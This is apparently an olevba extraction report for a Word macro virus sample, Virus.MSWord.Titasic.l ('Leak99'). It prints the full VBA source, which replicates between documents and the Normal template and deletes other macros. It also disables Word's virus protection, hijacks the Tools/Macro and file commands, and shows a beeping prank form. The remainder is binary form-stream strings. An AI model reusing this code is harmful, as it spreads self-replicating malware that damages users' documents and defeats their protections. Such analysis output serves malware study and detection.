olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Leak99.bas 
in file: Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601 - OLE stream: 'Macros/VBA/Leak99'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public AD As Object, aDes As Variant
Public NonLeakBali As Boolean, afound As Boolean, hapus As Boolean, reset As Boolean, aExc As Boolean, DocCount As Boolean
Function LeakMaster()
Dim nmak(1) As String
Dim NT As Object
Dim aSrc$
On Error GoTo selesai
nmak(0) = "Leak99"
nmak(1) = "LeakBali"

aSrc = MacroContainer
Set NT = NormalTemplate
If Not DocCount Then
Set AD = ActiveDocument
ElseIf aSrc <> "SNrml.dot" Then
aSrc = NT
End If

If aSrc = NT Then
aSrc = NT.FullName: Set aDes = AD
ElseIf aSrc = AD Then
aSrc = AD.FullName: Set aDes = NT
ElseIf aSrc = "SNrml.dot" Then
Set aDes = NT
aSrc = Options.DefaultFilePath(8) & "\SNrml.src"
End If

Mhapus aDes
With aDes.VBProject
If Not (Not hapus And .Description = "Leak99" And .VBComponents.Count > 2) Then
    Mcopy aSrc, aDes, nmak
    hapus = False
    .Description = "Leak99"
    If aDes = NT Then
        Options.SaveInterval = 1
        CustomizationContext = NT
        CommandBars("Tools").reset
        KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
        Command:="ToolsRecordMacroStart"
        aDes.Save
    End If
    CommandBars("Macro").Controls(2).OnAction = "ViewVbCode"
Else
GoTo Aksi
End If
End With
If afound = True Then Exit Function
Refresh
On Error Resume Next
Aksi:
If aExc = True Then Exit Function
Exit Function
selesai:
If Err.Number = 50289 Then MsgBox "That's good" & Chr(13) & "You have protected your Word perfectly", vbInformation, "LeakBali"
End Function

Sub Mhapus(Sfile)
Dim nmak As Object
For Each nmak In Sfile.VBProject.VBComponents
    If nmak.Name = "NewMacros" Then NonTitasic = True
    If nmak.Name <> "ThisDocument" And nmak.Name <> "NewMacros" _
    And nmak.Name <> "Leak99" And nmak.Name <> "LeakBali" Then
        hapus = True
        If reset Then
        Application.OrganizerDelete Sfile.FullName, nmak.Name, 3
        Else
        nmak.CodeModule.DeleteLines 1, nmak.CodeModule.CountOfLines
        End If
    End If
Next nmak
End Sub
Sub Mcopy(Sfile, Dfile, nmak)
Dim aNmak
For Each aNmak In nmak
Application.OrganizerCopy Sfile, Dfile.FullName, aNmak, 3
Next
End Sub
Sub Action()
Documents.Add
On Error Resume Next
With ActiveWindow
.Caption = "Leak99"
.ActivePane.View.Zoom.Percentage = 100
.View.FullScreen = Not .View.FullScreen
.DisplayRulers = False
.DisplayHorizontalScrollBar = False
.DisplayVerticalRuler = False
.DisplayVerticalScrollBar = False
.View.ShowTextBoundaries = False
    CommandBars("Full Screen").Position = 1
    With CommandBars("Full Screen").Controls(1)
    .Caption = "Leak99," & "  " & Date
    .Style = 3
    .FaceId = 281
    End With
.View.Type = 6
Randomize
With ActiveDocument.Background.Fill
.Visible = True
.PresetGradient Int((6 - 1) + rnd1), 1, Int((24 - 1) + rnd1)
End With
LeakBali.Show
.View.FullScreen = Not .View.FullScreen
End With
CommandBars("Full Screen").reset
WBT
ActiveDocument.Close 0
WBF
End Sub
Sub FileOpen()
WBT
If Dialogs(80).Show <> 0 Then
WBF
AutoOpen
Else
WBF
End If
End Sub

Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
LeakMaster
If Documents.Count > 1 Then
    For i = 1 To Documents.Count
    If Documents(i).Name <> ActiveDocument.Name Then
    Set AD = Documents(i)
    DocCount = True
    hapus = False
    LeakMaster
    End If
    Next
End If
If Now > DateSerial(1999, 3, 20) Then Application.OnTime When:=Now + TimeValue("00:45:00"), Name:="Leak99.Action"
End
End Sub
Sub ViewVbCode()
If MsgBox("Sorry, buddy.." & Chr(13) & "You should not try to remove this macro..!!" & Chr(13) & Chr(13) _
& "All you can do is just recording, editing" & Chr(13) & "or even removing your own macros." & Chr(13) & Chr(13) & " Would you like to record new macros..?", vbExclamation + vbYesNo, "LeakBali") _
= vbYes Then SendKeys "%m%s{down}~%dYour own macros%m"
End Sub
Sub AutoExec()
On Error Resume Next
If MacroContainer <> NormalTemplate Then
aExc = True
LeakMaster
WBT
AddIns.Unload False
WBF
End If
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub AutoExit()
Dim aAddin As Object
On Error GoTo batal
WBT
If Documents.Count <> 0 Then Documents.Close
Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
afound = True
For Each aAddin In AddIns
    If aAddin.Name = "SNrml.dot" Then afound = False
Next aAddin
        
If afound = True Then
Application.Visible = False
Documents.Add
LeakMaster
    With ActiveDocument
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\SNrml.src", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\SNrml.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
    End With
End If
Application.Quit
batal:
WBF
End Sub
Sub ToolsMacro()
WBF
On Error GoTo batal
Mhapus ActiveDocument
If NonLeakBali Then
    If MacroContainer = ActiveDocument Then Application.Run NormalTemplate.VBProject.Name & ".Leak99.ToolsMacro": Exit Sub
    Application.DisplayAlerts = 0
        With Dialogs(215)
        .Description = "This macros could not be remove, you only have permission to remove your own macros  (Descr: Your Own Macros)"
        If .Display = 1 Then .Execute
        End With
    Application.DisplayAlerts = -1
Else
ViewVbCode
End If
batal:
End Sub
Sub FileTemplates()
WBF
If Not reset Then Dialogs(87).Display
End Sub
Sub FormatStyle()
WBF
Dialogs(180).Show
End Sub
Function Refresh()
reset = True
FileTemplates
Mhapus aDes
End Function
Sub AutoClose()
Application.DisplayAlerts = -1
With Options
.SaveNormalPrompt = False
.SaveInterval = 10
.VirusProtection = False
End With
If ActiveWindow.Caption <> "LeakBali" And InStr(1, ActiveDocument.Name, "Docume", 1) = 0 _
And ActiveDocument.Name <> "SNrml.dot" Then LeakMaster
End Sub
Sub FileExit()
AutoExit
End Sub
Sub ToolsOptions()
Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
Dialogs(wdDialogToolsOptions).Show
Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
End Sub
Function WBT()
WordBasic.DisableAutoMacros True
End Function
Function WBF()
WordBasic.DisableAutoMacros False
End Function

-------------------------------------------------------------------------------
VBA MACRO LeakBali.frm 
in file: Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601 - OLE stream: 'Macros/VBA/LeakBali'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


















































































































Dim Teks(5) As String
Private Sub CommandButton1_Click()
Do
    With LeakBali
    .Height = .Height - 10
    .Width = .Width - 15
    If .Height < 25 Then Exit Do
    End With
    Beep
Loop
Unload Me
End Sub

Private Sub Frame1_Click()

End Sub

Private Sub Image1_Click()

End Sub

Private Sub Label1_Click()

End Sub

Private Sub Label2_Click()

End Sub

Private Sub Label4_Click()

End Sub

Private Sub UserForm_Activate()
TT
End Sub
Sub TT()
Dim a As Byte, diam As Boolean
Dim tp&, tm!, sel!, i%
a = 1
diam = True
LeakBali.Enabled = False
Do
    DoEvents
    sel = Timer - tm
    tp = tp + 1
    If tp Mod 300 = 0 Then
    Label4.ForeColor = &HFF
    End If
    If tp Mod 600 = 0 Then
    Label4.ForeColor = &H8
End If
    If sel > 0.1 Then
        tm = Timer
        i = i + 1
        If a = 5 Then Label1.Font.Size = 12: Label1.Width = Image1.Width
        Label1.Caption = Label1.Caption & Mid(Teks(a), i, 1)
            If Len(Label1.Caption) = Len(Teks(a)) Then
                If diam Then
                    Do
                    If Timer - tm > 1 Then Exit Do
                    DoEvents
                    Label4.ForeColor = LeakBali.BackColor
                    Loop
                    diam = False
                    If a = 5 Then GoTo catat
                End If
            Label2.Move Label2.Left - 9
            If Label2.Left <= Label1.Left Then GoSub catat
        End If
    End If
Loop
Exit Sub
catat:
If a <> 6 Then Label1.Caption = ""
tm = Timer
Label2.Left = Label1.Left + Label1.Width
a = a + 1
i = 0
diam = True
        If a = 6 Then
            Label4.Visible = False
            Frame1.Visible = True
            Image1.Visible = True
            LeakBali.Enabled = True
            CommandButton1.SetFocus
            Image1.Picture = LoadPicture(System.PrivateProfileString("", _
            "HKEY_CURRENT_USER\Control Panel\desktop", "Wallpaper"))
            Exit Sub
        End If
Return
End Sub
Private Sub UserForm_Layout()
Dim waktu%, eat$
waktu = Val(Format(Time, "hh"))
Select Case waktu
Case 12 To 13
eat = "Lunch"
Case 18 To 19
eat = "Dinner"
Case 6 To 8
eat = "Breakfast"
Case Else
Label4.Visible = False
End Select

Teks(1) = "Please have a rest for a while...!!"
Teks(2) = "Take it easy buddy..."
Teks(3) = "This is not a danger VIRUS which could damage your files.."
Teks(4) = "For you who interested to this message, especially a 'single girl', you may contact me at LeakBali@postmaster.co.uk..!"
Teks(5) = "Thanks for your patience..!"
Label2.Left = Label1.Left + Label1.Width
Label3.Caption = "By : Leak99" & Chr(13) & Chr(13) & "Thanks to : " & Chr(13) & Application.UserName
Label4.Caption = "Have you had your " & eat & " ?"
End Sub
Private Sub UserForm_Terminate()
    Dim i As Integer
    For i = 1 To 100
        Beep
    Next
End Sub
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Comic Sans MSyE
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Times New Roman
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Close    : �	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(:3=<9387@H\N@DWE78PmQW_bghg>Mqypdx\egc��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/cB8Bcccccccccccccccccccccccccccccccccccccccccccccccccc��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R��$3br�	

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz���������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B����	#3R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$4�%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz��������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Յ�����~lk
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s]_�"Z'���W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�	+��["�_�K��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�?���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
c�,�A+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[`đ�� f��N.�y]�!�(�v}=je&�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"O
�Np,H#�W�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��h����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��;� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C����V�J��'�օ'�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
U�K�~
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����2m��G8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z�CEjx�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���V�Q)5��CÒ<Z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ÈN?5���rb�%;N3\��ƭp���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*鴶x�$	�9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?�J���*�nN��#!��<�2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?:K{i-Ð��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��z��Lc�c2u�����u�� �L�r���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�cg&j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Mn��$�aE,�%�=�U�ͷ2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��z�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M���ܠ�<pFsPN�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ٽFx��H�KC*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
wz��[�G&�<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��۹�p���E�*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Fߛ<��Ek�ˢ2S�ԡ�H����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~�ے�X��)���r@P����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:ǯ];�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Wm
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3X>�T����(I���-��l%��� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�EΓat�4��=N�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��֔�0�z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}*���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
jO�!�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��R�OF8�(��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ufk6d\FAQ�U����6�-��{U���늸���ƥ��9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
oQ�Т�|e:��n�w��������2�TU��xe%�Z�E/��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ۜ���t@�א2q��\O��:��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���%��d*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
XI�t�{��c�}��X
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��qXp�w)�[�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����R���pJ�)f0�=����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k�����Cn,qW"�
����uWtjXa��zVl�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��6��n3�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,ف����˳�����T�/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�uFV���4�_�?����l�u��=���ƽpO����	k�/��ް����/Vs�9��c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4�a^9Ŀ)Vf_��֛�c�<g'���Y
�tT�q���yT��e��֗
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�j�-n���9���8=��Ү~�u�b)I䟺�*u��e{c�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�n�);.c[�͟݌�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[�y4yԳc�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ir�Bw2-���姶�����@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��{
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ߴ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Titasic.l-336568cefd35952f197e64e54b041682abb38601' - OLE stream: 'Macros/LeakBali/i09/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h��Z��is2
-------------------------------------------------------------------------------
